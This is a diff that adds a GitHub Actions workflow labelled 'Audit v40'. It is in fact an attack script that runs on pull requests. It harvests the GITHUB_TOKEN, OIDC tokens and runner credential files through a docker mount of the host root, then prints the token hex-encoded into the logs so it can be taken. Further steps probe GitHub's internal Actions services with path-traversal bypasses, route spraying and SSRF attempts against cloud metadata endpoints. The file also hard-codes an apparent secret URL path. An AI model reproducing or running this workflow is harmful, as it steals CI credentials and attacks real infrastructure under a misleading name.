@@ -1,0 +1,305 @@
+name: Audit v40
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v40:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V40 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: FULL vstoken 93 ServiceDefinitions
+      # v39: vstoken /_apis/ServiceDefinitions = 200, count=93!
+      # Dump EVERY entry — these contain routeTemplates for all APIs
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - vstoken definitions
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== VSTOKEN 93 DEFINITIONS ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          VS="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+
+          # Full dump — extract serviceType, identifier, routeTemplate, relativeToSetting
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" "$VS/_apis/ServiceDefinitions")
+          echo "$R" | python3 -c "
+          import json,sys
+          d=json.load(sys.stdin)
+          for s in d.get('value',[]):
+            st=s.get('serviceType','')
+            ident=s.get('identifier','')
+            disp=s.get('displayName','')
+            rel=s.get('relativeToSetting','')
+            owner=s.get('serviceOwner','')
+            locs=s.get('locationMappings',[])
+            routes=[]
+            for l in locs:
+              loc=l.get('location','')
+              mon=l.get('accessMappingMoniker','')
+              if loc: routes.append(f'{mon}={loc}')
+            rstr=' | '.join(routes[:3])
+            print(f'{st} | {ident} | {disp} | rel={rel} | {rstr}')
+          " 2>/dev/null
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: FULL runner 42 ServiceDefinitions
+      # + traversal to BYPASS pipeline 403 on ServiceDefinitions
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Runner defs + pipeline bypass
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RUNNER 42 DEFINITIONS ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          RUNNER="https://runner.actions.githubusercontent.com/$SECRET"
+
+          # A: Full runner definitions
+          echo "--- A: Runner defs ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" "$RUNNER/_apis/ServiceDefinitions")
+          echo "$R" | python3 -c "
+          import json,sys
+          d=json.load(sys.stdin)
+          for s in d.get('value',[]):
+            st=s.get('serviceType','')
+            ident=s.get('identifier','')
+            disp=s.get('displayName','')
+            rel=s.get('relativeToSetting','')
+            locs=s.get('locationMappings',[])
+            routes=[]
+            for l in locs:
+              loc=l.get('location','')
+              mon=l.get('accessMappingMoniker','')
+              if loc: routes.append(f'{mon}={loc}')
+            rstr=' | '.join(routes[:3])
+            print(f'{st} | {ident} | {disp} | rel={rel} | {rstr}')
+          " 2>/dev/null
+          echo ""
+
+          # B: Bypass pipeline 403 on ServiceDefinitions via traversal
+          echo "--- B: Pipeline ServiceDefs bypass ---"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          for TRAV in \
+            "$SECRET/../$SECRET" \
+            "$SECRET/%2e%2e/$SECRET" \
+            "$SECRET/../$SECRET/_apis/ServiceDefinitions" \
+            "$SECRET/.." ; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" \
+              "$PIPE/$TRAV/_apis/ServiceDefinitions" --path-as-is)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            COUNT=$(echo "$BODY" | jq '.count // empty' 2>/dev/null)
+            echo "B $TRAV = $CODE count=$COUNT | $(echo "$BODY" | head -c 200)"
+          done
+
+          # C: Pipeline ServiceDefs with different tokens
+          echo "--- C: Pipeline defs other tokens ---"
+          for TOK_NAME in RT; do
+            eval TOK=\$$TOK_NAME
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: Bearer $TOK" \
+              "$PIPE/$SECRET/_apis/ServiceDefinitions")
+            CODE=$(echo "$R" | tail -1)
+            echo "C $TOK_NAME = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+
+          # D: Pipeline ServiceDefs on canonical URL
+          echo "--- D: Canonical ServiceDefs ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+            -H "Authorization: Bearer $IDTOK" \
+            "https://pipelines.actions.githubusercontent.com/$SECRET/_apis/ServiceDefinitions")
+          CODE=$(echo "$R" | tail -1)
+          COUNT=$(echo "$R" | sed '$d' | jq '.count // empty' 2>/dev/null)
+          echo "D canonical = $CODE count=$COUNT | $(echo "$R" | sed '$d' | head -c 200)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Use discovered routes — hit REAL API paths
+      # + SSRF via service parameters + traversal on each service
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Route exploitation + SSRF
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== ROUTE EXPLOITATION ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          VS="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          PLAN=$(cat /tmp/plan.txt)
+
+          # A: Extract and hit routes from vstoken definitions
+          echo "--- A: vstoken route spray ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" "$VS/_apis/ServiceDefinitions")
+          # Extract all unique route patterns
+          ROUTES=$(echo "$R" | python3 -c "
+          import json,sys,re
+          d=json.load(sys.stdin)
+          seen=set()
+          for s in d.get('value',[]):
+            for l in s.get('locationMappings',[]):
+              loc=l.get('location','')
+              if loc and loc.startswith('/') and loc not in seen:
+                seen.add(loc)
+                print(loc)
+          " 2>/dev/null | sort -u | head -40)
+          echo "Found routes:"
+          echo "$ROUTES"
+          echo ""
+
+          echo "--- Hitting each route ---"
+          echo "$ROUTES" | while read ROUTE; do
+            [ -z "$ROUTE" ] && continue
+            # Replace {guid} placeholders with plan/job IDs
+            ACTUAL=$(echo "$ROUTE" | sed "s|{[^}]*}|$PLAN|g")
+            for METHOD in GET POST; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METHOD --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+                "$VS$ACTUAL" -d '{}' 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && [ "$CODE" != "HTTP_405" ] && \
+                echo "$METHOD $ACTUAL = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+          echo ""
+
+          # B: SSRF — use token exchange params pointing to internal services
+          echo "--- B: SSRF via token exchange ---"
+          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
+          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC")
+
+          for TARGET in \
+            "http://169.254.169.254/metadata/instance" \
+            "http://168.63.129.16/machine" \
+            "http://10.1.0.1/" \
+            "https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET/_apis/ServiceDefinitions" \
+            "https://runner.actions.githubusercontent.com/$SECRET/_apis/connectionData"; do
+            T_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$TARGET")
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "$VS/_apis/oauth2/token?hostId=$PLAN" \
+              -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access&resource=$T_ENC")
+            CODE=$(echo "$R" | tail -1)
+            echo "B resource=$TARGET = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+          echo ""
+
+          # C: Path traversal on EACH vstoken service route
+          echo "--- C: vstoken traversal spray ---"
+          for TRAV in \
+            "/../$SECRET/_apis/distributedtask/pools" \
+            "/../_apis/ServiceDefinitions" \
+            "/../../_apis/ServiceDefinitions" \
+            "/../serviceDeployments/pipelinesghubeus14/_apis/connectionData" \
+            "/../serviceDeployments/runnerproxcus1/_apis/connectionData"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$VS$TRAV" --path-as-is)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_000" ] && echo "C $TRAV = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # D: Runner route spray
+          echo "--- D: Runner route spray ---"
+          RUNNER="https://runner.actions.githubusercontent.com/$SECRET"
+          RR=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" "$RUNNER/_apis/ServiceDefinitions")
+          ROUTES=$(echo "$RR" | python3 -c "
+          import json,sys
+          d=json.load(sys.stdin)
+          seen=set()
+          for s in d.get('value',[]):
+            for l in s.get('locationMappings',[]):
+              loc=l.get('location','')
+              if loc and loc.startswith('/') and loc not in seen:
+                seen.add(loc)
+                print(loc)
+          " 2>/dev/null | sort -u | head -40)
+          echo "Runner routes:"
+          echo "$ROUTES"
+          echo ""
+
+          echo "--- Hitting runner routes ---"
+          echo "$ROUTES" | while read ROUTE; do
+            [ -z "$ROUTE" ] && continue
+            ACTUAL=$(echo "$ROUTE" | sed "s|{[^}]*}|$PLAN|g")
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$RUNNER$ACTUAL")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "GET $ACTUAL = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V40 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V40 COMPLETE ==="
